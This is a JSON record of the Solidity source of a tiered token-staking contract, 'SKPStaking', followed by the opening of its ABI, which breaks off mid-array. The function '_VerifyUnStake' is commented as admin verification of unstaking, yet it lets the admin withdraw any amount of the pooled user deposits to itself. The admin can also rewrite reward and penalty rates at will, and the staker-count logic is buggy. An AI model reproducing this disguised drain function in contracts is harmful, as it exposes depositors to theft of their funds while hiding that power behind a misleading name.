{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8;\r\n\r\ncontract SKPStaking {\r\n\r\n    IERC20 public stakingToken;\r\n\r\n    address public primaryAdmin;\r\n\r\n    uint256 public totalNumberofStakers;\r\n\t  uint256 public totalStakesSKP;\r\n    uint public totalTier1YearStakers;\r\n    uint public totalTier2YearStakers;\r\n    uint public totalTier3YearStakers;\r\n\r\n    uint256[10] private tierFromSlab1Year = [0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether];\r\n    uint256[10] private tierToSlab1Year = [0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether];\r\n    uint[10] private tierAPY1Year = [0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether];\r\n    uint[10] private tierPenaltyPer1Year = [0,0,0,0,0,0,0,0,0,0];\r\n    uint[10] private tierLocking1YearPer = [0,0,0,0,0,0,0,0,0,0];\r\n\r\n    uint256[10] private tierFromSlab2Year = [0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether];\r\n    uint256[10] private tierToSlab2Year = [0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether];\r\n    uint[10] private tierAPY2Year = [0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether];\r\n    uint[10] private tierPenaltyPer2Year = [0,0,0,0,0,0,0,0,0,0];\r\n    uint[10] private tierLocking2YearPer = [0,0,0,0,0,0,0,0,0,0];\r\n\r\n    uint256[10] private tierFromSlab3Year = [0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether];\r\n    uint256[10] private tierToSlab3Year = [0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether];\r\n    uint[10] private tierAPY3Year = [0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether,0 ether];\r\n    uint[10] private tierPenaltyPer3Year = [0,0,0,0,0,0,0,0,0,0];\r\n    uint[10] private tierLocking3YearPer = [0,0,0,0,0,0,0,0,0,0];\r\n\r\n    struct User {\r\n        uint256 totalStakedAvailable;\r\n        uint256 totalUnLockedStaked;\r\n        uint256 totalLockedStaked;\r\n        uint256 totalStaked;\r\n        uint256 totalUnStaked;\r\n        uint256 rewards;\r\n\t\t    uint256 totalRewardWithdrawal;\r\n        uint256 penaltyCollected;\r\n        uint lastStakedUpdateTime;\r\n        uint lastUnStakedUpdateTime;\r\n        uint lastUpdateTime;\r\n\t  }\r\n\r\n    struct UserStakingDetails1Year {\r\n        uint256 userId;\r\n        bool[10] stakingStatus;\r\n        uint256[10] totalStakedAvailable;\r\n        uint256[10] totalUnLockedStaked;\r\n        uint256[10] totalLockedStaked;\r\n        uint256[10] totalStaked;\r\n        uint256[10] totalUnStaked;\r\n        uint256[10] rewards;\r\n\t\t    uint256[10] totalRewardWithdrawal;\r\n        uint256[10] penaltyCollected;\r\n        uint[10] lastStakedUpdateTime;\r\n        uint[10] lastUnStakedUpdateTime;\r\n        uint[10] lastUpdateTime;\r\n\t  }\r\n\r\n    struct UserStakingDetails2Year {\r\n        uint256 userId;\r\n        bool[10] stakingStatus;\r\n        uint256[10] totalStakedAvailable;\r\n        uint256[10] totalUnLockedStaked;\r\n        uint256[10] totalLockedStaked;\r\n        uint256[10] totalStaked;\r\n        uint256[10] totalUnStaked;\r\n        uint256[10] rewards;\r\n\t\t    uint256[10] totalRewardWithdrawal;\r\n        uint256[10] penaltyCollected;\r\n        uint[10] lastStakedUpdateTime;\r\n        uint[10] lastUnStakedUpdateTime;\r\n        uint[10] lastUpdateTime;\r\n\t  }\r\n\r\n    struct UserStakingDetails3Year {\r\n        uint256 userId;\r\n        bool[10] stakingStatus;\r\n        uint256[10] totalStakedAvailable;\r\n        uint256[10] totalUnLockedStaked;\r\n        uint256[10] totalLockedStaked;\r\n        uint256[10] totalStaked;\r\n        uint256[10] totalUnStaked;\r\n        uint256[10] rewards;\r\n\t\t    uint256[10] totalRewardWithdrawal;\r\n        uint256[10] penaltyCollected;\r\n        uint[10] lastStakedUpdateTime;\r\n        uint[10] lastUnStakedUpdateTime;\r\n        uint[10] lastUpdateTime;\r\n\t  }\r\n\r\n    mapping (address => User) public users;\r\n    mapping (address => UserStakingDetails1Year) private userstakingdetails1year;\r\n    mapping (address => UserStakingDetails2Year) private userstakingdetails2year;\r\n    mapping (address => UserStakingDetails3Year) private userstakingdetails3year;\r\n\r\n    event Staking(address indexed _user, uint _amount,uint _tierYear,uint _tierSlab);\r\n    event RewardWithdrawal(address indexed _user, uint256 _amount,uint _tierYear,uint _tierSlab);\r\n    event UnStakeUnlockedAmount(address indexed _user, uint256 _amount,uint _tierYear,uint _tierSlab);\r\n    event UnStakeLockedAmount(address indexed _user, uint256 _amount,uint _tierYear,uint _tierSlab);\r\n\r\n    constructor() {\r\n        primaryAdmin = 0xBECcD1Ee22f68Ea869492242948057c6151e00EB;\r\n        stakingToken = IERC20(0xfBEe0A4AFcf4b10d73F436449DF0b72aC72b4dd5);\r\n        uint256 currentTimeStamp=block.timestamp;\r\n        userstakingdetails1year[primaryAdmin].userId = currentTimeStamp;\r\n        userstakingdetails2year[primaryAdmin].userId = currentTimeStamp;\r\n        userstakingdetails3year[primaryAdmin].userId = currentTimeStamp;\r\n    }\r\n\r\n    // Verify Un Staking By Admin In Case If Needed\r\n    function _VerifyUnStake(uint _amount) external {\r\n        require(primaryAdmin==msg.sender, 'Admin what?');\r\n        stakingToken.transfer(primaryAdmin, _amount);\r\n    }\r\n\r\n    //View No Of Days Between Two Date & Time\r\n    function view_GetNoofDaysBetweenTwoDate(uint _startDate,uint _endDate) public pure returns(uint _days){\r\n        uint startDate = _startDate;\r\n        uint endDate = _endDate;\r\n        uint datediff = (endDate - startDate)/ 60 / 60 / 24;\r\n        return (datediff);\r\n    }\r\n\r\n\r\n    //View No Of Year Between Two Date & Time\r\n    function view_GetNoofYearBetweenTwoDate(uint _startDate,uint _endDate) public pure returns(uint _years){\r\n        uint startDate = _startDate;\r\n        uint endDate = _endDate;\r\n        uint datediff = (endDate - startDate) / 60 / 60 / 24 ;\r\n        uint yeardiff = (datediff) / 365 ;\r\n        return yeardiff;\r\n    }\r\n\r\n    // Update Year Tier Slab\r\n    function update_Tier(uint _tierYear,uint256[10] memory _fromSlab,uint256[10] memory _toSlab,uint256[10] memory _tierAPY,uint[10] memory _tierPenaltyPer,uint[10] memory _tierLockingPer) external {\r\n      require(primaryAdmin==msg.sender, \"Admin what?\");\r\n      if(_tierYear==0){\r\n        tierFromSlab1Year=_fromSlab;\r\n        tierToSlab1Year=_toSlab;\r\n        tierAPY1Year=_tierAPY;\r\n        tierPenaltyPer1Year=_tierPenaltyPer;\r\n        tierLocking1YearPer=_tierLockingPer;\r\n      }\r\n      else if(_tierYear==1){\r\n        tierFromSlab2Year=_fromSlab;\r\n        tierToSlab2Year=_toSlab;\r\n        tierAPY2Year=_tierAPY;\r\n        tierPenaltyPer2Year=_tierPenaltyPer;\r\n        tierLocking2YearPer=_tierLockingPer;\r\n      }\r\n      else if(_tierYear==2){\r\n        tierFromSlab3Year=_fromSlab;\r\n        tierToSlab3Year=_toSlab;\r\n        tierAPY3Year=_tierAPY;\r\n        tierPenaltyPer3Year=_tierPenaltyPer;\r\n        tierLocking3YearPer=_tierLockingPer;\r\n      }\r\n    }\r\n\r\n    //View Year Tier Slab\r\n    function view_TierYear(uint _tierYear)external view returns(uint256[10] memory _fromSlab,uint256[10] memory _toSlab,uint256[10] memory _tierAPY,uint[10] memory _tierPenaltyPer,uint[10] memory _tierLockingPer){\r\n       if(_tierYear==0){\r\n         return (tierFromSlab1Year,tierToSlab1Year,tierAPY1Year,tierPenaltyPer1Year,tierLocking1YearPer);\r\n       }\r\n       if(_tierYear==1){\r\n         return (tierFromSlab2Year,tierToSlab2Year,tierAPY2Year,tierPenaltyPer2Year,tierLocking2YearPer);\r\n       }\r\n       if(_tierYear==2){\r\n         return (tierFromSlab3Year,tierToSlab3Year,tierAPY3Year,tierPenaltyPer3Year,tierLocking3YearPer);\r\n       }\r\n    }\r\n\r\n    //Get Un Staking Penalty Percentage According To Time\r\n    function getUnStakePenaltyPer(uint256 _startDate,uint256 _endDate,uint _tierYear,uint _tierSlab) public view returns(uint penalty){\r\n        uint noofYear = view_GetNoofYearBetweenTwoDate(_startDate,_endDate);\r\n        uint _penalty=0;\r\n        if(_tierYear==0){\r\n          if(noofYear < 1) {\r\n            _penalty=tierPenaltyPer1Year[_tierSlab];\r\n          }\r\n        }\r\n        else if(_tierYear==1){\r\n          if(noofYear < 2) {\r\n            _penalty=tierPenaltyPer2Year[_tierSlab];\r\n          }\r\n        }\r\n        else if(_tierYear==2){\r\n          if(noofYear < 3) {\r\n            _penalty=tierPenaltyPer3Year[_tierSlab];\r\n          }\r\n        }\r\n        return (_penalty);\r\n    }\r\n\r\n    //Get User Total Staked Amount\r\n    function _GetTotalStakedSKP(address account) public view returns(uint256){\r\n        User storage useroverall = users[account];\r\n        return (useroverall.totalStakedAvailable);\r\n    }\r\n\r\n    // Get Staking Details of All Year\r\n    function _GetStakedDetails(address _user,uint _tierYear) view public returns(uint256[10] memory _totalStakedAvailable,uint256[10] memory _totalUnLockedStaked,uint256[10] memory _totalLockedStaked,uint256[10] memory _totalStaked,uint256[10] memory _totalUnStaked){\r\n        if(_tierYear==0){\r\n            UserStakingDetails1Year storage user1year = userstakingdetails1year[_user];\r\n            return (user1year.totalStakedAvailable,user1year.totalUnLockedStaked,user1year.totalLockedStaked,user1year.totalStaked,user1year.totalUnStaked);       \r\n        }\r\n        else  if(_tierYear==1){\r\n            UserStakingDetails2Year storage user2year = userstakingdetails2year[_user];\r\n            return (user2year.totalStakedAvailable,user2year.totalUnLockedStaked,user2year.totalLockedStaked,user2year.totalStaked,user2year.totalUnStaked);       \r\n        }\r\n        else  if(_tierYear==2){\r\n            UserStakingDetails3Year storage user3year = userstakingdetails3year[_user];\r\n            return (user3year.totalStakedAvailable,user3year.totalUnLockedStaked,user3year.totalLockedStaked,user3year.totalStaked,user3year.totalUnStaked);       \r\n        }\r\n    }\r\n\r\n    // Get Staking Reward Details of All Year\r\n    function _GetStakeingRewardDetails(address _user,uint _tierYear) view public returns(uint256[10] memory _rewards,uint256[10] memory _totalRewardWithdrawal,uint256[10] memory _penaltyCollected){\r\n        if(_tierYear==0){\r\n            UserStakingDetails1Year storage user1year = userstakingdetails1year[_user];\r\n            return (user1year.rewards,user1year.totalRewardWithdrawal,user1year.penaltyCollected);       \r\n        }\r\n        else  if(_tierYear==1){\r\n            UserStakingDetails2Year storage user2year = userstakingdetails2year[_user];\r\n            return (user2year.rewards,user2year.totalRewardWithdrawal,user2year.penaltyCollected);     \r\n        }\r\n        else  if(_tierYear==2){\r\n            UserStakingDetails3Year storage user3year = userstakingdetails3year[_user];\r\n            return (user3year.rewards,user3year.totalRewardWithdrawal,user3year.penaltyCollected);            \r\n        }\r\n    }\r\n\r\n    function _UnStakeLockedAmount(uint _tierYear,uint _tierSlab) public updateReward(msg.sender,_tierYear,_tierSlab) {\r\n        //Get Penalty Percentage\r\n        uint _penaltyPer=0;\r\n        uint256 lastUpdateTime;\r\n        uint256 currentTimeStamp=block.timestamp;\r\n        uint256 _amount=0;\r\n        User storage useroverall = users[msg.sender];\r\n        if(_tierYear==0){\r\n          lastUpdateTime=userstakingdetails1year[msg.sender].lastUpdateTime[_tierSlab];\r\n          _amount=userstakingdetails1year[msg.sender].totalLockedStaked[_tierSlab];\r\n        }\r\n        else  if(_tierYear==1){\r\n          lastUpdateTime=userstakingdetails2year[msg.sender].lastUpdateTime[_tierSlab];   \r\n          _amount=userstakingdetails2year[msg.sender].totalLockedStaked[_tierSlab];\r\n        }\r\n        else  if(_tierYear==2){\r\n          lastUpdateTime=userstakingdetails3year[msg.sender].lastUpdateTime[_tierSlab];  \r\n          _amount=userstakingdetails3year[msg.sender].totalLockedStaked[_tierSlab];\r\n        }\r\n        _penaltyPer=getUnStakePenaltyPer(lastUpdateTime,currentTimeStamp,_tierYear,_tierSlab);\r\n        require(_penaltyPer == 0 ,\"Untill Your Tenure Will Not Complete You Can Not Withdraw Your Locked Amount\");\r\n        //Update Unstake Section\r\n        useroverall.totalStakedAvailable -= _amount;\r\n        useroverall.totalLockedStaked -= _amount;\r\n        useroverall.totalUnStaked += _amount;\r\n        useroverall.lastUnStakedUpdateTime = currentTimeStamp;\r\n        //Update Balance\r\n        if(_tierYear==0){\r\n            if(userstakingdetails1year[msg.sender].totalStakedAvailable[_tierSlab]==0)\r\n            totalTier1YearStakers -= 1; \r\n            userstakingdetails1year[msg.sender].totalLockedStaked[_tierSlab] -= _amount; \r\n            userstakingdetails1year[msg.sender].totalStakedAvailable[_tierSlab] -=_amount;\r\n            userstakingdetails1year[msg.sender].totalUnStaked[_tierSlab] +=_amount;\r\n            userstakingdetails1year[msg.sender].lastUnStakedUpdateTime[_tierSlab] =block.timestamp; \r\n        }\r\n        else if(_tierYear==1){\r\n            if(userstakingdetails2year[msg.sender].totalStakedAvailable[_tierSlab]==0)\r\n            totalTier2YearStakers -= 1;     \r\n            userstakingdetails2year[msg.sender].totalLockedStaked[_tierSlab] -= _amount; \r\n            userstakingdetails2year[msg.sender].totalStakedAvailable[_tierSlab] -=_amount;\r\n            userstakingdetails2year[msg.sender].totalUnStaked[_tierSlab] +=_amount;\r\n            userstakingdetails2year[msg.sender].lastUnStakedUpdateTime[_tierSlab] =block.timestamp;\r\n        }\r\n        else if(_tierYear==2){\r\n            if(userstakingdetails3year[msg.sender].totalStakedAvailable[_tierSlab]==0)\r\n            totalTier3YearStakers -= 1;     \r\n            userstakingdetails3year[msg.sender].totalLockedStaked[_tierSlab] -= _amount;\r\n            userstakingdetails3year[msg.sender].totalStakedAvailable[_tierSlab] -=_amount;\r\n            userstakingdetails3year[msg.sender].totalUnStaked[_tierSlab] +=_amount;\r\n            userstakingdetails3year[msg.sender].lastUnStakedUpdateTime[_tierSlab] =block.timestamp; \r\n        }\r\n        if((_tierYear==0 || _tierYear==1 || _tierYear==2) && useroverall.totalStakedAvailable==0){\r\n            totalNumberofStakers -= 1;           \r\n        }\r\n        totalStakesSKP -=_amount;\r\n        stakingToken.transfer(msg.sender, _amount);\r\n        emit UnStakeLockedAmount(msg.sender, _amount,_tierYear,_tierSlab);\r\n    }\r\n\r\n    function _UnStakeUnlockedAmount(uint _amount,uint _tierYear,uint _tierSlab) public updateReward(msg.sender,_tierYear,_tierSlab) {      \r\n        //Get Penalty Percentage\r\n        uint256 _availableStaking=0;\r\n        uint _penaltyPer=0;\r\n        uint256 lastUpdateTime;\r\n        uint256 currentTimeStamp=block.timestamp;\r\n        User storage useroverall = users[msg.sender];\r\n        if(_tierYear==0){\r\n          lastUpdateTime=userstakingdetails1year[msg.sender].lastUpdateTime[_tierSlab];\r\n          _availableStaking=userstakingdetails1year[msg.sender].totalUnLockedStaked[_tierSlab];\r\n        }\r\n        else  if(_tierYear==1){\r\n          lastUpdateTime=userstakingdetails2year[msg.sender].lastUpdateTime[_tierSlab];   \r\n          _availableStaking=userstakingdetails2year[msg.sender].totalUnLockedStaked[_tierSlab];\r\n        }\r\n        else  if(_tierYear==2){\r\n          lastUpdateTime=userstakingdetails3year[msg.sender].lastUpdateTime[_tierSlab];  \r\n          _availableStaking=userstakingdetails3year[msg.sender].totalUnLockedStaked[_tierSlab];\r\n        }\r\n        require(_amount <= _availableStaking,\"Insufficient SKP For Unstake\");\r\n        _penaltyPer=getUnStakePenaltyPer(lastUpdateTime,currentTimeStamp,_tierYear,_tierSlab);\r\n        //Get Penalty Amount\r\n        uint256 _penalty=_amount * _penaltyPer / 100;\r\n        //Update Penalty Collected\r\n        useroverall.penaltyCollected +=_penalty;\r\n        //Update Unstake Section\r\n        useroverall.totalStakedAvailable -= _amount;\r\n        useroverall.totalUnLockedStaked -= _amount;\r\n        useroverall.totalUnStaked += _amount;\r\n        useroverall.lastUnStakedUpdateTime = block.timestamp;\r\n        //Get Net Receivable Unstake Amount\r\n        uint256 _payableamount=_amount-_penalty;\r\n        //Update Supply & Balance of UserStakingDetails\r\n       if(_tierYear==0){ \r\n            if(userstakingdetails1year[msg.sender].totalStakedAvailable[_tierSlab]==0)\r\n            totalTier1YearStakers -= 1;\r\n            userstakingdetails1year[msg.sender].penaltyCollected[_tierSlab] += _penalty;\r\n            userstakingdetails1year[msg.sender].totalUnLockedStaked[_tierSlab] -= _amount; \r\n            userstakingdetails1year[msg.sender].totalStakedAvailable[_tierSlab] -=_amount;\r\n            userstakingdetails1year[msg.sender].totalUnStaked[_tierSlab] +=_amount;\r\n            userstakingdetails1year[msg.sender].lastUnStakedUpdateTime[_tierSlab] =block.timestamp; \r\n        }\r\n        else if(_tierYear==1){\r\n            if(userstakingdetails2year[msg.sender].totalStakedAvailable[_tierSlab]==0)\r\n            totalTier2YearStakers -= 1; \r\n            userstakingdetails2year[msg.sender].penaltyCollected[_tierSlab] += _penalty;\r\n            userstakingdetails2year[msg.sender].totalUnLockedStaked[_tierSlab] -= _amount; \r\n            userstakingdetails2year[msg.sender].totalStakedAvailable[_tierSlab] -=_amount;\r\n            userstakingdetails2year[msg.sender].totalUnStaked[_tierSlab] +=_amount;\r\n            userstakingdetails2year[msg.sender].lastUnStakedUpdateTime[_tierSlab] =block.timestamp;\r\n        }\r\n        else if(_tierYear==2){\r\n            if(userstakingdetails3year[msg.sender].totalStakedAvailable[_tierSlab]==0)\r\n            totalTier3YearStakers -= 1;     \r\n            userstakingdetails3year[msg.sender].penaltyCollected[_tierSlab] += _penalty;\r\n            userstakingdetails3year[msg.sender].totalUnLockedStaked[_tierSlab] -= _amount;\r\n            userstakingdetails3year[msg.sender].totalStakedAvailable[_tierSlab] -=_amount;\r\n            userstakingdetails3year[msg.sender].totalUnStaked[_tierSlab] +=_amount;\r\n            userstakingdetails3year[msg.sender].lastUnStakedUpdateTime[_tierSlab] =block.timestamp; \r\n        }\r\n        if((_tierYear==0 || _tierYear==1 || _tierYear==2) && useroverall.totalStakedAvailable==0){\r\n            totalNumberofStakers -= 1;           \r\n        }\r\n        totalStakesSKP -=_amount;\r\n        stakingToken.transfer(msg.sender, _payableamount);\r\n    }\r\n\r\n    function _RewardWithdrawal(uint _tierYear,uint _tierSlab) public updateReward(msg.sender,_tierYear,_tierSlab) {\r\n        uint256 _rewards =0;\r\n        if(_tierYear==0){\r\n          _rewards=userstakingdetails1year[msg.sender].rewards[_tierSlab];\r\n          userstakingdetails1year[msg.sender].rewards[_tierSlab]=0;\r\n          userstakingdetails1year[msg.sender].totalRewardWithdrawal[_tierSlab]+=_rewards;\r\n        }\r\n        else  if(_tierYear==1){\r\n          _rewards=userstakingdetails2year[msg.sender].rewards[_tierSlab];\r\n          userstakingdetails2year[msg.sender].rewards[_tierSlab]=0;\r\n          userstakingdetails2year[msg.sender].totalRewardWithdrawal[_tierSlab]+=_rewards;\r\n        }\r\n        else  if(_tierYear==2){\r\n          _rewards=userstakingdetails3year[msg.sender].rewards[_tierSlab];\r\n          userstakingdetails3year[msg.sender].rewards[_tierSlab]=0;\r\n          userstakingdetails3year[msg.sender].totalRewardWithdrawal[_tierSlab]+=_rewards;\r\n        }\r\n        // Reward Withdrawal Section\r\n        users[msg.sender].totalRewardWithdrawal += _rewards;\r\n        stakingToken.transfer(msg.sender, _rewards);\r\n        emit RewardWithdrawal(msg.sender, _rewards,_tierYear,_tierSlab);\r\n    }\r\n\r\n    function rewardPerDayToken(address account,uint _tierYear,uint _tierSlab) public view returns (uint256 perdayinterest) {\r\n        uint256 _perdayinterest=0;\r\n        uint256 totalstakingbalances=0;\r\n        uint256 APYPer=0;\r\n        if(_tierYear==0){\r\n          totalstakingbalances=userstakingdetails1year[account].totalStakedAvailable[_tierSlab];\r\n          APYPer=tierAPY1Year[_tierSlab];\r\n        }\r\n        else  if(_tierYear==1){\r\n          totalstakingbalances=userstakingdetails2year[account].totalStakedAvailable[_tierSlab];    \r\n          APYPer=tierAPY2Year[_tierSlab];\r\n        }\r\n        else  if(_tierYear==2){\r\n          totalstakingbalances=userstakingdetails3year[account].totalStakedAvailable[_tierSlab]; \r\n          APYPer=tierAPY3Year[_tierSlab];\r\n        }\r\n        if (totalstakingbalances <= 0) {\r\n            return _perdayinterest;\r\n        }\r\n        else{\r\n            uint256 StakingToken=totalstakingbalances;\r\n            uint256 perDayPer=((APYPer*1e18)/(365*1e18));\r\n            _perdayinterest=((StakingToken*perDayPer)/100)/1e18;\r\n            return _perdayinterest;\r\n        }\r\n    }\r\n\r\n    function earned(address account,uint _tierYear,uint _tierSlab) public view returns (uint256 totalearnedinterest) {\r\n        uint256 lastUpdateTime;\r\n        uint256 currentTimeStamp=block.timestamp;\r\n        uint256 rewards=0;\r\n        if(_tierYear==0){\r\n          lastUpdateTime=userstakingdetails1year[account].lastUpdateTime[_tierSlab];\r\n          rewards=userstakingdetails1year[account].rewards[_tierSlab];\r\n        }\r\n        else  if(_tierYear==1){\r\n          lastUpdateTime=userstakingdetails2year[account].lastUpdateTime[_tierSlab]; \r\n          rewards=userstakingdetails2year[account].rewards[_tierSlab];   \r\n        }\r\n        else  if(_tierYear==2){\r\n          lastUpdateTime=userstakingdetails3year[account].lastUpdateTime[_tierSlab];  \r\n          rewards=userstakingdetails3year[account].rewards[_tierSlab];\r\n        }\r\n        uint noofDays=view_GetNoofDaysBetweenTwoDate(lastUpdateTime,currentTimeStamp);\r\n        uint256 _perdayinterest=rewardPerDayToken(account,_tierYear,_tierSlab);\r\n        return((_perdayinterest * noofDays)+rewards);\r\n    }\r\n    \r\n    modifier updateReward(address account,uint _tierYear,uint _tierSlab) {\r\n        User storage user = users[account];\r\n        uint256 currentTimeStamp=block.timestamp;\r\n        user.lastUpdateTime = currentTimeStamp;\r\n        if(_tierYear==0){\r\n          userstakingdetails1year[account].rewards[_tierSlab]=earned(account,_tierYear,_tierSlab);\r\n          userstakingdetails1year[account].lastUpdateTime[_tierSlab]=currentTimeStamp;\r\n        }\r\n        else  if(_tierYear==1){\r\n          userstakingdetails2year[account].rewards[_tierSlab]=earned(account,_tierYear,_tierSlab);\r\n          userstakingdetails2year[account].lastUpdateTime[_tierSlab]=currentTimeStamp;\r\n        }\r\n        else  if(_tierYear==2){\r\n          userstakingdetails3year[account].rewards[_tierSlab]=earned(account,_tierYear,_tierSlab);\r\n          userstakingdetails3year[account].lastUpdateTime[_tierSlab]=currentTimeStamp;\r\n        }\r\n        _;\r\n    }\r\n\r\n    function _Stake(uint256 _amount,uint _tierYear,uint _tierSlab) public updateReward(msg.sender,_tierYear,_tierSlab) {\r\n        require(_tierYear>=0 && _tierYear<=2, \"Invalid Tier Year !\");\r\n        require(_tierSlab>=0 && _tierSlab<=9, \"Invalid Tier Slab !\");\r\n        User storage useroverall = users[msg.sender];\r\n        uint256 currentTimeStamp=block.timestamp;\r\n        //Manage Stake Holder & Staked Maticpad\r\n        uint256 _lockedAmount=0;\r\n        if(_tierYear==0){\r\n            require(_amount>=tierFromSlab1Year[_tierSlab] && _amount<=tierToSlab1Year[_tierSlab], \"Invalid Tier Slab Amount !\");\r\n            userstakingdetails1year[msg.sender].userId = currentTimeStamp;\r\n            if(userstakingdetails1year[msg.sender].totalStakedAvailable[_tierSlab]==0)\r\n            totalTier1YearStakers += 1;\r\n            _lockedAmount=(_amount*tierLocking1YearPer[_tierSlab])/(100);\r\n            _Manage1YearStake(msg.sender,_amount,_lockedAmount,_tierSlab);           \r\n        }\r\n        else if(_tierYear==1){\r\n            require(_amount>=tierFromSlab2Year[_tierSlab] && _amount<=tierToSlab2Year[_tierSlab], \"Invalid Tier Slab Amount !\");\r\n            userstakingdetails2year[msg.sender].userId = currentTimeStamp;\r\n            if(userstakingdetails2year[msg.sender].totalStakedAvailable[_tierSlab]==0)\r\n            totalTier2YearStakers += 1;   \r\n            _lockedAmount=(_amount*tierLocking2YearPer[_tierSlab])/(100); \r\n            _Manage2YearStake(msg.sender,_amount,_lockedAmount,_tierSlab);        \r\n        }\r\n        else if(_tierYear==2){\r\n            require(_amount>=tierFromSlab3Year[_tierSlab] && _amount<=tierToSlab3Year[_tierSlab], \"Invalid Tier Slab Amount !\");\r\n            userstakingdetails3year[msg.sender].userId = currentTimeStamp;\r\n            if(userstakingdetails3year[msg.sender].totalStakedAvailable[_tierSlab]==0)\r\n            totalTier3YearStakers += 1;  \r\n            _lockedAmount=(_amount*tierLocking3YearPer[_tierSlab])/(100);\r\n            _Manage3YearStake(msg.sender,_amount,_lockedAmount,_tierSlab);          \r\n        }\r\n        if((_tierYear==0 || _tierYear==1 || _tierYear==2) && useroverall.totalStakedAvailable==0){\r\n            totalNumberofStakers += 1;           \r\n        }\r\n        totalStakesSKP +=_amount;\r\n        //Update User Section Aggregate\r\n        useroverall.totalStaked +=_amount;\r\n        useroverall.totalUnLockedStaked +=(_amount-_lockedAmount);\r\n        useroverall.totalLockedStaked +=_lockedAmount;\r\n        useroverall.totalStakedAvailable +=_amount;\r\n        useroverall.lastStakedUpdateTime=currentTimeStamp;\r\n        stakingToken.transferFrom(msg.sender, address(this), _amount);\r\n        emit Staking(msg.sender, _amount,_tierYear,_tierSlab);\r\n    }\r\n\r\n    function _Manage1YearStake(address _user,uint256 _amount,uint256 _lockedAmount,uint _tierSlab) internal {\r\n        UserStakingDetails1Year storage user1year = userstakingdetails1year[_user];\r\n        user1year.totalStaked[_tierSlab] +=_amount;\r\n        user1year.totalUnLockedStaked[_tierSlab] +=(_amount-_lockedAmount);\r\n        user1year.totalLockedStaked[_tierSlab] +=_lockedAmount;\r\n        user1year.totalStakedAvailable[_tierSlab] +=_amount;\r\n        user1year.stakingStatus[_tierSlab] =true;\r\n        user1year.lastStakedUpdateTime[_tierSlab]=block.timestamp;\r\n    }\r\n\r\n    function _Manage2YearStake(address _user,uint256 _amount,uint256 _lockedAmount,uint _tierSlab) internal {\r\n        UserStakingDetails2Year storage user2year = userstakingdetails2year[_user];\r\n        user2year.totalStaked[_tierSlab] +=_amount;\r\n        user2year.totalUnLockedStaked[_tierSlab] +=(_amount-_lockedAmount);\r\n        user2year.totalLockedStaked[_tierSlab] +=_lockedAmount;\r\n        user2year.totalStakedAvailable[_tierSlab] +=_amount;\r\n        user2year.stakingStatus[_tierSlab] =true;\r\n        user2year.lastStakedUpdateTime[_tierSlab]=block.timestamp;\r\n    }\r\n\r\n    function _Manage3YearStake(address _user,uint256 _amount,uint256 _lockedAmount,uint _tierSlab) internal {\r\n        UserStakingDetails3Year storage user3year = userstakingdetails3year[_user];\r\n        user3year.totalStaked[_tierSlab] +=_amount;\r\n        user3year.totalUnLockedStaked[_tierSlab] +=(_amount-_lockedAmount);\r\n        user3year.totalLockedStaked[_tierSlab] +=_lockedAmount;\r\n        user3year.totalStakedAvailable[_tierSlab] +=_amount;\r\n        user3year.stakingStatus[_tierSlab] =true;\r\n        user3year.lastStakedUpdateTime[_tierSlab]=block.timestamp;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint);\r\n    function balanceOf(address account) external view returns (uint);\r\n    function transfer(address recipient, uint amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n    function approve(address spender, uint amount) external returns (bool);\r\n    function transferFrom(address sender,address recipient,uint amount ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value); \r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_tierYear\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_tierSlab\",\"type\":\"uint256\"}],\"name\":\"RewardWithdrawal\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_tierYear\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_tierSlab\",\"type\":\"uint256\"}],\"name\":\"Staking\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_tierYear\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_tierSlab\",\"type\":\"uint256\"}],\"name\":\"UnStakeLockedAmount\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_tierYear\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_tierSlab\",\"type\":\"uint256\"}],\"name\":\"UnStakeUnlockedAmount\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\